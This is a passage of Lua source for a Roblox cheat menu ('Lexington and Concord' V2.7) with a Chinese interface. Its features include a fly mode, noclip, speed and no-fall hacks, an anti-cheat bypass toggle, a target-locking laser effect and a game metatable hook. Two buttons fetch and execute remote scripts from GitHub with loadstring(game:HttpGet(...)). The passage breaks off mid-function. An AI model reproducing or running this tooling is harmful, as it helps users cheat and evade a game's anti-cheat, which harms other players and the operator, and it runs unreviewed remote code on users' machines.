-- 核心飞行逻辑
function startFlyCameraCore()
    if flyCameraEnabled then return end
    flyCameraEnabled = true

    flyCameraSavedType = Camera.CameraType
    flyCameraSavedSubject = Camera.CameraSubject

    local char = localPlayer.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            flyCameraSavedPlatformStand = hum.PlatformStand
            pcall(function() hum.PlatformStand = true end)
        end
    end

    flyCameraVelocity = Vector3.new(0, 0, 0)
    local pos = getPlayerPos() or Camera.CFrame.Position
    local look = Camera.CFrame.LookVector

    -- 防止 look 是零向量导致 CFrame.new(origin, target) 报错
    if look.Magnitude < 0.001 then
        look = Vector3.new(0, 0, -1)
    end

    flyCameraPos = pos + Vector3.new(0, 5, 0)
    flyCameraTargetRot = CFrame.new(flyCameraPos, flyCameraPos + look * 10)
    flyCameraCurrentRot = flyCameraTargetRot

    pcall(function() Camera.CameraType = Enum.CameraType.Scriptable end)
    pcall(function() Camera.CameraSubject = nil end)

    if flyCameraMode == "pc" then
        pcall(function() UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter end)
        pcall(function() UserInputService.MouseIconEnabled = false end)
    elseif flyCameraMode == "mobile" then
        showFlyMobileControls()
    end

    flyCameraConn = RunService.RenderStepped:Connect(function(dt)
        if not flyCameraEnabled then return end
        pcall(function() Camera.CameraType = Enum.CameraType.Scriptable end)
        pcall(function() Camera.CameraSubject = nil end)

        local look = flyCameraTargetRot.LookVector
        local right = flyCameraTargetRot.RightVector
        local up = Vector3.new(0, 1, 0)

        local moveDir = Vector3.new(0, 0, 0)

        if flyCameraMode == "pc" then
            pcall(function() if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + look end end)
            pcall(function() if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - look end end)
            pcall(function() if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - right end end)
            pcall(function() if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + right end end)
            pcall(function() if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + up end end)
            pcall(function() if UserInputService:IsKeyDown(Enum.KeyCode.Q) then moveDir = moveDir - up end end)
        elseif flyCameraMode == "mobile" then
            if flyJoystickActive and flyJoystickVector.Magnitude > 0.05 then
                moveDir = moveDir + look * (-flyJoystickVector.Y)
                moveDir = moveDir + right * flyJoystickVector.X
            end
            if flyBtnUp then moveDir = moveDir + up end
            if flyBtnDown then moveDir = moveDir - up end
        end

        if moveDir.Magnitude > 0 then
            moveDir = moveDir.Unit
        end

        local spd = flyCameraSpeed
        local shiftPressed = false
        pcall(function() shiftPressed = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) end)
        if (flyCameraMode == "pc" and shiftPressed) or (flyCameraMode == "mobile" and flyBtnFast) then
            spd = spd * 2.5
        end

        local targetVel = moveDir * spd
        if targetVel.Magnitude > 0.1 then
            flyCameraVelocity = flyCameraVelocity:Lerp(targetVel, 0.25)
        else
            flyCameraVelocity = flyCameraVelocity:Lerp(Vector3.new(0, 0, 0), 0.35)
            if flyCameraVelocity.Magnitude < 0.5 then
                flyCameraVelocity = Vector3.new(0, 0, 0)
            end
        end

        flyCameraPos = flyCameraPos + flyCameraVelocity * dt
        flyCameraCurrentRot = flyCameraCurrentRot:Lerp(flyCameraTargetRot, 0.15)

        pcall(function()
            Camera.CFrame = CFrame.new(flyCameraPos) * flyCameraCurrentRot
            Camera.Focus = Camera.CFrame * CFrame.new(0, 0, -10)
        end)
    end)

    if flyCameraMode == "pc" then
        flyCameraInputConn = UserInputService.InputChanged:Connect(function(input)
            if not flyCameraEnabled then return end
            if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
            local delta = input.Delta
            local yaw = -delta.X * flyCameraSensitivity * 0.01
            local pitch = -delta.Y * flyCameraSensitivity * 0.01
            local euler = {flyCameraTargetRot:ToEulerAnglesYXZ()}
            flyCameraTargetRot = CFrame.fromEulerAnglesYXZ(
                math.clamp(euler[1] + pitch, -1.4, 1.4),
                euler[2] + yaw,
                0
            )
        end)
    end

    WindUI:Notify({ Title = "飞行模式", Content = flyCameraMode == "pc" and "PC端已启动 (WASD移动, 鼠标转向)" or "手机端已启动 (摇杆+按钮控制)", Duration = 2 })
end

function stopFlyCamera()
    if not flyCameraEnabled then return end
    flyCameraEnabled = false
    flyCameraVelocity = Vector3.new(0, 0, 0)

    if flyCameraConn then
        flyCameraConn:Disconnect()
        flyCameraConn = nil
    end

    if flyCameraInputConn then
        flyCameraInputConn:Disconnect()
        flyCameraInputConn = nil
    end

    if flyMobileUI then
        flyMobileUI:Destroy()
        flyMobileUI = nil
    end

    local char = localPlayer.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            pcall(function() hum.PlatformStand = flyCameraSavedPlatformStand end)
        end
    end

    pcall(function() Camera.CameraType = flyCameraSavedType end)
    pcall(function() Camera.CameraSubject = flyCameraSavedSubject end)

    if flyCameraMode == "pc" then
        pcall(function() UserInputService.MouseBehavior = Enum.MouseBehavior.Default end)
        pcall(function() UserInputService.MouseIconEnabled = true end)
    end

    flyCameraMode = nil
    flyJoystickActive = false
    flyJoystickVector = Vector2.new(0, 0)
    flyBtnUp = false
    flyBtnDown = false
    flyBtnFast = false

    WindUI:Notify({ Title = "飞行模式", Content = "已关闭", Duration = 2 })
end


AutoTab:Divider()
AutoTab:Toggle({ Title = "飞行模式", Desc = "启动后选择PC端或手机端控制方式", Value = false, Callback = function(state)
    if state then
        showFlyCameraModeSelector()
    else
        stopFlyCamera()
    end
end })
AutoTab:Slider({ Title = "飞行速度", Step = 5, Value = { Min = 5, Max = 200, Default = 40 }, Callback = function(v)
    flyCameraSpeed = v
end })
AutoTab:Slider({ Title = "鼠标灵敏度", Step = 0.05, Value = { Min = 0.1, Max = 1, Default = 0.3 }, Callback = function(v)
    flyCameraSensitivity = v
end })


EntertainmentTab = Window:Tab({ Title = "loc:TAB_ENTERTAINMENT", Icon = "gamepad" })

AnimSection = EntertainmentTab:Section({ Title = "loc:ANIM_TITLE", Icon = "film", Opened = true })
animStates = {}
for _, anim in ipairs(normalAnims) do
    local animName = anim[1]
    local animId = anim[2]
    if animName == "祖国人" then
        AnimSection:Toggle({ Title = "祖国人", Value = false, Callback = function(state)
            if state then
                for _, a in ipairs(normalAnims) do
                    if a[1] ~= "祖国人" and animStates[a[2]] then
                        animStates[a[2]] = false
                    end
                end
                stopLoopAnim()
                if currentAnimTrack then
                    currentAnimTrack:Stop()
                    currentAnimTrack = nil
                end
                currentAnimId = nil
                startZGR()
                animStates[animId] = true
            else
                stopZGR()
                animStates[animId] = false
            end
        end })
    else
        AnimSection:Toggle({ Title = animName, Value = false, Callback = function(state)
            if state then
                for _, a in ipairs(normalAnims) do
                    if a[2] ~= animId and animStates[a[2]] then
                        animStates[a[2]] = false
                    end
                end
                if _G.NEX_LC_VARS.zgrActive then stopZGR() end
                stopLoopAnim()
                playNormalAnim(animId)
                animStates[animId] = true
            else
                if currentAnimTrack then
                    currentAnimTrack:Stop()
                    currentAnimTrack = nil
                end
                currentAnimId = nil
                animStates[animId] = false
            end
        end })
    end
end
AnimSection:Divider()
local daoguanState = false
local daoguanTrack = nil
AnimSection:Toggle({ Title = "倒馆", Desc = "播放倒馆动画 (rbxassetid://72042024)", Value = false, Callback = function(state)
    if state then
        stopAllAnims()
        for k in pairs(animStates) do animStates[k] = false end
        for k in pairs(loopStates) do loopStates[k] = false end
        local animator = getAnimator()
        if animator then
            local anim = Instance.new("Animation")
            anim.AnimationId = "rbxassetid://72042024"
            daoguanTrack = animator:LoadAnimation(anim)
            if daoguanTrack then
                daoguanTrack.Looped = true
                daoguanTrack:Play()
            end
        end
        daoguanState = true
    else
        if daoguanTrack then
            daoguanTrack:Stop()
            daoguanTrack = nil
        end
        daoguanState = false
    end
end })
loopStates = {}
for _, anim in ipairs(loopAnims) do
    local animName = anim[1]
    local animId = anim[2]
    AnimSection:Toggle({ Title = animName .. " (循环)", Value = false, Callback = function(state)
        if state then
            if daoguanState then
                daoguanState = false
                if daoguanTrack then daoguanTrack:Stop(); daoguanTrack = nil end
            end
            for _, a in ipairs(loopAnims) do
                if a[2] ~= animId and loopStates[a[2]] then
                    loopStates[a[2]] = false
                end
            end
            if _G.NEX_LC_VARS.zgrActive then stopZGR() end
            if currentAnimTrack then
                currentAnimTrack:Stop()
                currentAnimTrack = nil
            end
            currentAnimId = nil
            startLoopAnim(animId)
            loopStates[animId] = true
        else
            stopLoopAnim()
            loopStates[animId] = false
        end
    end })
end
AnimSection:Divider()
AnimSection:Button({ Title = "停止全部动画", Callback = function()
    stopAllAnims()
    for k in pairs(animStates) do animStates[k] = false end
    for k in pairs(loopStates) do loopStates[k] = false end
    if daoguanTrack then daoguanTrack:Stop(); daoguanTrack = nil end
    daoguanState = false
    WindUI:Notify({ Title = "动画", Content = "已停止所有动画", Duration = 2 })
end })

AnimSection:Divider()
AnimSection:Toggle({ Title = "红眼特效（激光+高亮）", Desc = "独立于祖国人动画，开启后双眼发射红色激光锁定敌人", Value = false, Callback = function(state)
    _G.NEX_LC_VARS.homelandLaserEnabled = state
    if state then
        startHomelandLaser()
    else
        stopHomelandLaser()
    end
end })

VisualSection = EntertainmentTab:Section({ Title = "🎨 视觉特效", Icon = "eye", Opened = true })
VisualSection:Toggle({ Title = "loc:TOGGLE_ZOMBIE", Desc = "loc:DESC_ZOMBIE", Value = false, Callback = function(s)
    toggleZombie(s)
end })
VisualSection:Toggle({ Title = "loc:TOGGLE_ENV_STORM", Desc = "loc:DESC_ENV_STORM", Value = false, Callback = function(s)
    toggleStorm(s)
end })

ReplaceSection = EntertainmentTab:Section({ Title = "🔄 替换模型", Icon = "swap", Opened = true })
ReplaceSection:Input({ Title = "要替换的武器名 (匹配)", Placeholder = "军刀", Default = "军刀", Callback = function(val)
    sourceWeapon = val or "军刀"
end })
ReplaceSection:Divider()
ReplaceSection:Paragraph({ Title = "📦 内置网格预设", Content = "", Color = Color3.fromRGB(100, 200, 255) })
local meshPresetToggles = {}

meshPresetToggles["AWM"] = ReplaceSection:Toggle({ Title = "预设：AWM", Desc = "使用 AWM 狙击枪模型", Value = false, Callback = function(state)
    if state then
        setMeshPreset("预设：AWM")
        -- 取消其他预设
        for name, toggle in pairs(meshPresetToggles) do
            if name ~= "AWM" and toggle.SetValue then
                pcall(function() toggle:SetValue(false) end)
            end
        end
        if useLightsaberToggle then pcall(function() useLightsaberToggle:SetValue(false) end) end
        if pickupPlayerToggle then pcall(function() pickupPlayerToggle:SetValue(false) end) end
    else
        if selectedMeshPreset == "预设：AWM" then
            selectedMeshPreset = nil
            if activeClonedModel then
                activeClonedModel:Destroy()
                activeClonedModel = nil
            end
        end
    end
end })
meshPresetToggles["knife"] = ReplaceSection:Toggle({ Title = "预设：knife", Desc = "使用 knife 小刀模型", Value = false, Callback = function(state)
    if state then
        setMeshPreset("预设：knife")
        for name, toggle in pairs(meshPresetToggles) do
            if name ~= "knife" and toggle.SetValue then
                pcall(function() toggle:SetValue(false) end)
            end
        end
        if useLightsaberToggle then pcall(function() useLightsaberToggle:SetValue(false) end) end
        if pickupPlayerToggle then pcall(function() pickupPlayerToggle:SetValue(false) end) end
    else
        if selectedMeshPreset == "预设：knife" then
            selectedMeshPreset = nil
            if activeClonedModel then
                activeClonedModel:Destroy()
                activeClonedModel = nil
            end
        end
    end
end })
meshPresetToggles["miku"] = ReplaceSection:Toggle({ Title = "预设：miku", Desc = "使用 miku 模型", Value = false, Callback = function(state)
    if state then
        setMeshPreset("预设：miku")
        for name, toggle in pairs(meshPresetToggles) do
            if name ~= "miku" and toggle.SetValue then
                pcall(function() toggle:SetValue(false) end)
            end
        end
        if useLightsaberToggle then pcall(function() useLightsaberToggle:SetValue(false) end) end
        if pickupPlayerToggle then pcall(function() pickupPlayerToggle:SetValue(false) end) end
    else
        if selectedMeshPreset == "预设：miku" then
            selectedMeshPreset = nil
            if activeClonedModel then
                activeClonedModel:Destroy()
                activeClonedModel = nil
            end
        end
    end
end })
meshPresetToggles["砖头"] = ReplaceSection:Toggle({ Title = "预设：砖头", Desc = "使用砖头模型", Value = false, Callback = function(state)
    if state then
        setMeshPreset("预设：砖头")
        for name, toggle in pairs(meshPresetToggles) do
            if name ~= "砖头" and toggle.SetValue then
                pcall(function() toggle:SetValue(false) end)
            end
        end
        if useLightsaberToggle then pcall(function() useLightsaberToggle:SetValue(false) end) end
        if pickupPlayerToggle then pcall(function() pickupPlayerToggle:SetValue(false) end) end
    else
        if selectedMeshPreset == "预设：砖头" then
            selectedMeshPreset = nil
            if activeClonedModel then
                activeClonedModel:Destroy()
                activeClonedModel = nil
            end
        end
    end
end })
ReplaceSection:Divider()
ReplaceSection:Paragraph({ Title = "⚔️ 其他替换模式", Content = "", Color = Color3.fromRGB(255, 200, 100) })
useLightsaberToggle = ReplaceSection:Toggle({ Title = "使用光剑", Desc = "将武器替换为赛博极光剑", Value = false, Callback = function(state)
    useLightsaber = state
    if state then
        pickupPlayer = false
        selectedMeshPreset = nil
        -- 取消所有网格预设
        for name, toggle in pairs(meshPresetToggles) do
            if toggle.SetValue then
                pcall(function() toggle:SetValue(false) end)
            end
        end
        if pickupPlayerToggle then pcall(function() pickupPlayerToggle:SetValue(false) end) end
        WindUI:Notify({ Title = "替换模式", Content = "已启用光剑模式", Duration = 2 })
    end
    if activeClonedModel then
        activeClonedModel:Destroy()
        activeClonedModel = nil
    end
end })
pickupPlayerToggle = ReplaceSection:Toggle({ Title = "拿起玩家", Desc = "随机选取一名友方玩家作为武器模型", Value = false, Callback = function(state)
    pickupPlayer = state
    if state then
        useLightsaber = false
        selectedMeshPreset = nil
        -- 取消所有网格预设
        for name, toggle in pairs(meshPresetToggles) do
            if toggle.SetValue then
                pcall(function() toggle:SetValue(false) end)
            end
        end
        if useLightsaberToggle then pcall(function() useLightsaberToggle:SetValue(false) end) end
        WindUI:Notify({ Title = "替换模式", Content = "已启用拿起玩家模式", Duration = 2 })
    end
    if activeClonedModel then
        activeClonedModel:Destroy()
        activeClonedModel = nil
    end
end })

OtherTab = Window:Tab({ Title = "loc:TAB_OTHER", Icon = "wrench" })
OtherTab:Toggle({ Title = "loc:TOGGLE_ANTI_CHEAT_BYPASS", Desc = "loc:DESC_ANTI_CHEAT_BYPASS", Value = false, Callback = function(state)
    _G.NEX_LC_VARS.hookBypassEnabled = state
    updateHookBypass()
end })
OtherTab:Toggle({ Title = "修改速度安全阈值", Desc = "开启后将 WalkSpeed 强制设为 21.6，关闭恢复原速", Value = false, Callback = function(state)
    speedThresholdEnabled = state
    updateSpeedThreshold()
end })
OtherTab:Button({ Title = "飞行模式", Desc = "点击开启独立飞行面板（绕过反作弊）", Callback = function()
    local flyScript = [=[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local lp = Players.LocalPlayer
local camera = workspace.CurrentCamera
local pgui = lp:WaitForChild("PlayerGui")

local ControlModule = require(lp.PlayerScripts:WaitForChild("PlayerModule")):GetControls()

local bv_new = nil
local animCache_new = nil
local hrp_new = nil
local hum_new = nil
local isFlying_new = false
local flySpeed_new = 40
local flyTurner_new = nil

local SmoothTurner = {}
SmoothTurner.__index = SmoothTurner

function SmoothTurner.new(rootPart, camera)
    local self = setmetatable({}, SmoothTurner)
    self.RootPart = rootPart
    self.Camera = camera or workspace.CurrentCamera
    self.Enabled = false
    self.BodyGyro = nil
    return self
end

function SmoothTurner:Start()
    if self.Enabled or not self.RootPart or not self.RootPart.Parent then return end
    local gyro = Instance.new("BodyGyro")
    gyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    gyro.P = 10000
    gyro.D = 50
    gyro.CFrame = self.RootPart.CFrame
    gyro.Parent = self.RootPart
    self.BodyGyro = gyro
    self.Enabled = true

    self.HeartbeatConn = RunService.Heartbeat:Connect(function()
        if not self.Enabled or not self.BodyGyro or not self.RootPart or not self.Camera then return end
        local look = self.Camera.CFrame.LookVector
        self.BodyGyro.CFrame = CFrame.lookAt(self.RootPart.Position, self.RootPart.Position + look.Unit)
    end)
end

function SmoothTurner:Destroy()
    self.Enabled = false
    if self.BodyGyro then self.BodyGyro:Destroy() end
    if self.HeartbeatConn then self.HeartbeatConn:Disconnect() end
end

local function clearFlyRes_new()
    if animCache_new and lp.Character then animCache_new.Parent = lp.Character end
    if bv_new then bv_new:Destroy() end
    bv_new = nil
    if flyTurner_new then flyTurner_new:Destroy(); flyTurner_new = nil end
    if hum_new and hum_new.Parent then hum_new:ChangeState(Enum.HumanoidStateType.Running) end
end

local function stopFly_new()
    if not isFlying_new then return end
    isFlying_new = false
    clearFlyRes_new()
end

local function startFly_new()
    if isFlying_new then return end
    local char = lp.Character
    if not char then return end

    hrp_new = char:WaitForChild("HumanoidRootPart")
    hum_new = char:WaitForChild("Humanoid")
    isFlying_new = true

    local ani = char:FindFirstChild("Animate")
    if ani then animCache_new = ani; ani.Parent = nil end

    if hrp_new:FindFirstChild("LeipzigBV_new") then hrp_new.LeipzigBV_new:Destroy() end
    bv_new = Instance.new("BodyVelocity", hrp_new)
    bv_new.Name = "LeipzigBV_new"
    bv_new.MaxForce = Vector3.new(1e6, 1e6, 1e6)

    flyTurner_new = SmoothTurner.new(hrp_new, camera)
    flyTurner_new:Start()

    task.spawn(function()
        while isFlying_new and char.Parent do
            local mv = ControlModule:GetMoveVector()
            local cf = camera.CFrame
            local dir = (cf.LookVector * -mv.Z) + (cf.RightVector * mv.X)

            if mv.Magnitude > 0 then
                bv_new.Velocity = dir.Unit * flySpeed_new
            else
                bv_new.Velocity = Vector3.new(0, 0.01, 0)
            end

            hum_new:ChangeState(Enum.HumanoidStateType.Climbing)
            RunService.RenderStepped:Wait()
        end
        clearFlyRes_new()
    end)
end

local function bindCharacter_new()
    local char = lp.Character or lp.CharacterAdded:Wait()
    hrp_new = char:WaitForChild("HumanoidRootPart")
    hum_new = char:WaitForChild("Humanoid")
    clearFlyRes_new()
    char.AncestryChanged:Connect(function(_, parent)
        if not parent then
            clearFlyRes_new()
            bindCharacter_new()
        end
    end)
end
task.spawn(bindCharacter_new)

if pgui:FindFirstChild("PureFlightUI") then pgui.PureFlightUI:Destroy() end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PureFlightUI"
ScreenGui.Parent = pgui
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 150, 0, 130)
MainFrame.Position = UDim2.new(0.5, -75, 0.3, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
MainFrame.BackgroundTransparency = 0.2
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local UIStroke = Instance.new("UIStroke", MainFrame)
UIStroke.Color = Color3.fromRGB(85, 170, 255)
UIStroke.Thickness = 2

local UICorner = Instance.new("UICorner", MainFrame)
UICorner.CornerRadius = UDim.new(0, 8)

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 25)
Title.BackgroundTransparency = 1
Title.Text = "独立飞行面板"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 13
Title.Font = Enum.Font.GothamBold

local SpeedInput = Instance.new("TextBox", MainFrame)
SpeedInput.Size = UDim2.new(0, 120, 0, 24)
SpeedInput.Position = UDim2.new(0.5, -60, 0, 32)
SpeedInput.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
SpeedInput.Text = tostring(flySpeed_new)
SpeedInput.TextColor3 = Color3.fromRGB(255, 255, 255)
SpeedInput.TextSize = 12
SpeedInput.Font = Enum.Font.Gotham
Instance.new("UICorner", SpeedInput).CornerRadius = UDim.new(0, 4)

SpeedInput.FocusLost:Connect(function()
    local val = tonumber(SpeedInput.Text)
    if val then flySpeed_new = math.clamp(val, 10, 200) else flySpeed_new = 40 end
    SpeedInput.Text = tostring(flySpeed_new)
end)

local FlyBtn = Instance.new("TextButton", MainFrame)
FlyBtn.Size = UDim2.new(0, 120, 0, 26)
FlyBtn.Position = UDim2.new(0.5, -60, 0, 64)
FlyBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
FlyBtn.Text = "进入飞行"
FlyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FlyBtn.TextSize = 12
FlyBtn.Font = Enum.Font.Gotham
Instance.new("UICorner", FlyBtn).CornerRadius = UDim.new(0, 4)

FlyBtn.MouseButton1Click:Connect(function()
    if isFlying_new then
        stopFly_new()
        FlyBtn.Text = "进入飞行"
        FlyBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
    else
        startFly_new()
        FlyBtn.Text = "飞行中"
        FlyBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 100)
    end
end)

local DestroyBtn = Instance.new("TextButton", MainFrame)
DestroyBtn.Size = UDim2.new(0, 120, 0, 24)
DestroyBtn.Position = UDim2.new(0.5, -60, 0, 98)
DestroyBtn.BackgroundColor3 = Color3.fromRGB(120, 40, 40)
DestroyBtn.Text = "卸载并关闭"
DestroyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
DestroyBtn.TextSize = 11
DestroyBtn.Font = Enum.Font.Gotham
Instance.new("UICorner", DestroyBtn).CornerRadius = UDim.new(0, 4)

DestroyBtn.MouseButton1Click:Connect(function()
    stopFly_new()
    ScreenGui:Destroy()
end)
]=]
    loadstring(flyScript)()
end })OtherTab:Toggle({ Title = "高亮视角", Desc = "开启后场景全图高亮（无暗处）", Value = false, Callback = function(state)
    highlightEnabled = state
    updateHighlight()
end })
OtherTab:Toggle({ Title = "loc:TOGGLE_SPEED", Desc = "loc:DESC_SPEED", Value = false, Callback = function(s)
    _G.NEX_LC_VARS.speedEnabled = s
    updateSpeed()
end })
OtherTab:Slider({ Title = "loc:SLIDER_SPEED", Step = 1, Value = { Min = 3, Max = 150, Default = 16 }, Callback = function(v)
    _G.NEX_LC_VARS.currentSpeed = v
end })
OtherTab:Toggle({ Title = "loc:TOGGLE_NO_SLOW", Desc = "loc:DESC_NO_SLOW", Value = false, Callback = function(s)
    _G.NEX_LC_VARS.noSlowEnabled = s
    updateNoSlow()
end })
OtherTab:Toggle({ Title = "loc:TOGGLE_SPIN", Value = false, Callback = function(s)
    _G.NEX_LC_VARS.spinEnabled = s
    updateSpin()
end })
OtherTab:Slider({ Title = "loc:SLIDER_SPIN_SPEED", Step = 100, Value = { Min = 0, Max = 2000, Default = 0 }, Callback = function(v)
    _G.NEX_LC_VARS.spinSpeed = v
end })
OtherTab:Toggle({ Title = "loc:TOGGLE_NOCLIP", Desc = "关闭碰撞（可穿墙）", Value = false, Callback = function(state)
    toggleNoclip(state)
    _G.NEX_LC_VARS.noclipEnabled = state
end })
OtherTab:Toggle({ Title = "loc:TOGGLE_NO_FALL", Value = false, Callback = function(v)
    _G.NEX_LC_VARS.noFallEnabled = v
    updateNoFall()
end })
OtherTab:Toggle({ Title = "loc:TOGGLE_ULTRA_FOV", Desc = "loc:DESC_ULTRA_FOV", Value = false, Callback = function(v)
    _G.NEX_LC_VARS.ultraFOVEnabled = v
    updateUltraFOV()
end })
OtherTab:Slider({ Title = "loc:SLIDER_FOV_VALUE", Step = 5, Value = { Min = 70, Max = 180, Default = 120 }, Callback = function(v)
    _G.NEX_LC_VARS.fovValue = v
    if _G.NEX_LC_VARS.ultraFOVEnabled then
        workspace.CurrentCamera.FieldOfView = v
    end
end })
OtherTab:Toggle({ Title = "loc:TOGGLE_PERF_MODE", Value = false, Callback = function(s)
    _G.NEX_LC_VARS.perfMode = s
    setPerfMode(s)
end })
OtherTab:Button({ Title = "林墨玦脚本", Callback = function()
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Matds78/Script/refs/heads/main/LC"))()
        end)
    end)
end })

SettingsTab = Window:Tab({ Title = "loc:TAB_SETTINGS", Icon = "settings" })
SettingsSection = SettingsTab:Section({ Title = "设置", Icon = "globe", Opened = true })
SettingsSection:Dropdown({
    Title = "语言",
    Values = { "English", "中文" },
    Default = "中文",
    SearchBarEnabled = false,
    MenuWidth = 150,
    Callback = function(sel)
        WindUI:SetLanguage(sel == "English" and "en" or "zh-cn")
    end
})

local themes = {}
local ok, t = pcall(function() return WindUI:GetThemes() end)
if ok and type(t) == "table" then
    for name, _ in pairs(t) do
        table.insert(themes, name)
    end
end
if #themes == 0 then
    themes = { "Dark", "Light", "Indigo", "Yellow", "Purple", "Red" }
end
table.sort(themes)

SettingsSection:Dropdown({
    Title = "主题",
    Values = themes,
    Default = customThemeEnabled and "Custom" or "Indigo",
    SearchBarEnabled = false,
    MenuWidth = 190,
    Callback = function(sel)
        pcall(function()
            WindUI:SetTheme(sel)
            WindUI.TransparencyValue = 0.2
        end)
    end
})

SettingsSection:Divider()

SettingsSection:Toggle({
    Title = "自定义主题",
    Desc = "(开启后需重新启动脚本)配置会自动保存",
    Value = customThemeEnabled,
    Callback = function(state)
        customThemeEnabled = state
        themeConfigData.custom_theme_enabled = state
        saveThemeConfig(themeConfigData)
        if state then
            WindUI:AddTheme(CustomTheme)
            WindUI:SetTheme("Custom")
            pcall(function()
                Window:SetBackgroundImageTransparency(0.15)
                Window:SetBackground(savedBg)
            end)
            WindUI:Notify({ Title = "主题", Content = "已切换至自定义主题", Duration = 2 })
        else
            WindUI:SetTheme("Indigo")
            pcall(function()
                Window:SetBackgroundImageTransparency(1)
                Window:SetBackground("")
            end)
            WindUI:Notify({ Title = "主题", Content = "已切换至默认主题", Duration = 2 })
        end
    end
})

SettingsSection:Slider({
    Title = "主题透明度",
    Desc = "窗口背景图透明度",
    Value = { Min = 0.1, Max = 1, Default = 0.15 },
    Step = 0.01,
    Callback = function(val)
        pcall(function()
            Window:SetBackgroundImageTransparency(val)
        end)
    end
})

SettingsSection:Divider()

ConfigSection = SettingsTab:Section({ Title = "loc:SECTION_CONFIG", Icon = "save", Opened = true })
configInput = ConfigSection:Input({ Title = "配置名称", Placeholder = "例如：我的配置1", Width = 200 })
ConfigSection:Button({ Title = "loc:BTN_SAVE_CONFIG", Callback = function()
    local name = configInput:GetValue()
    if name and name ~= "" then
        saveConfig(name)
        configInput:SetValue("")
    else
        WindUI:Notify({ Title = "错误", Content = "loc:CONFIG_EMPTY_NAME", Duration = 2 })
    end
end })
ConfigSection:Button({ Title = "loc:BTN_LOAD_CONFIG", Callback = function()
    local name = configInput:GetValue()
    if name and name ~= "" then
        loadConfig(name)
        configInput:SetValue("")
    else
        WindUI:Notify({ Title = "错误", Content = "loc:CONFIG_EMPTY_NAME", Duration = 2 })
    end
end })

SettingsSection:Divider()
SettingsSection:Button({ Title = "彻底退出脚本", Callback = function()
    stopUltraFOV()
    toggleDesyncUI(false)
    if _G.NEX_LC_VARS.zgrActive then stopZGR() end
    stopBypass()
    disableSilentHook()
    pcall(function()
        local mt = getrawmetatable(game)
        if mt then
            setreadonly(mt, false)
            mt.__namecall = nil
            setreadonly(mt, true)
        end
    end)
    Window:Destroy()
end })

-- ===== Chat Tab =====
ChatTab = Window:Tab({ Title = "loc:TAB_CHAT", Icon = "message-circle" })
ChatSection = ChatTab:Section({ Title = "💬 聊天系统", Icon = "message-circle", Opened = true })
ChatSection:Paragraph({ 
    Title = "📌 说明", 
    Content = "点击下方按钮加载全局聊天系统", 
    Color = Color3.fromRGB(200, 200, 200) 
})
ChatSection:Divider()
ChatSection:Button({ 
    Title = "loc:BTN_LOAD_CHAT", 
    Desc = "loc:DESC_LOAD_CHAT", 
    Callback = function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/sjjjnxnx-dot/nex-scirpt/refs/heads/main/chat.lua"))()
            WindUI:Notify({ Title = "聊天系统", Content = "已加载", Duration = 2 })
        end)
    end 
})

Window:Tag({ Title = "Lexington and Concord", Icon = "github", Color = Color3.fromHex("#30ff6a") })
Window:Tag({ Title = "V2.7", Icon = "tag", Color = Color3.fromRGB(255, 200, 100) })
Window:Divider()

function createAutoChargeUI()
    if _G.NEX_LC_VARS.autoChargeGui then return end
    local gui = Instance.new("ScreenGui", CoreGui)
    gui.Name = "AutoChargeUI"
    gui.ResetOnSpawn = false
    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0, 120, 0, 48)
    frame.Position = UDim2.new(0, 10, 0.5, -24)
    frame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
    frame.BackgroundTransparency = 0.5
    frame.BorderSizePixel = 0
    frame.Draggable = true
    frame.Active = true
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 6)
    Instance.new("UIStroke", frame).Color = Color3.fromRGB(255, 100, 255)
    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1, 0, 0, 16)
    title.Text = "⚡冲锋"
    title.TextColor3 = Color3.fromRGB(255, 150, 255)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 10
    local toggle = Instance.new("TextButton", frame)
    toggle.Size = UDim2.new(1, -12, 0, 20)
    toggle.Position = UDim2.new(0, 6, 0, 22)
    toggle.Text = _G.NEX_LC_VARS.autoChargeEnabled and "关闭" or "开启"
    toggle.BackgroundColor3 = _G.NEX_LC_VARS.autoChargeEnabled and Color3.fromRGB(20, 60, 20) or Color3.fromRGB(60, 20, 20)
    toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggle.Font = Enum.Font.GothamBold
    toggle.TextSize = 10
    toggle.BorderSizePixel = 0
    Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 4)
    toggle.MouseButton1Click:Connect(function()
        local newState = not _G.NEX_LC_VARS.autoChargeEnabled
        _G.NEX_LC_VARS.autoChargeEnabled = newState
        updateAutoCharge()
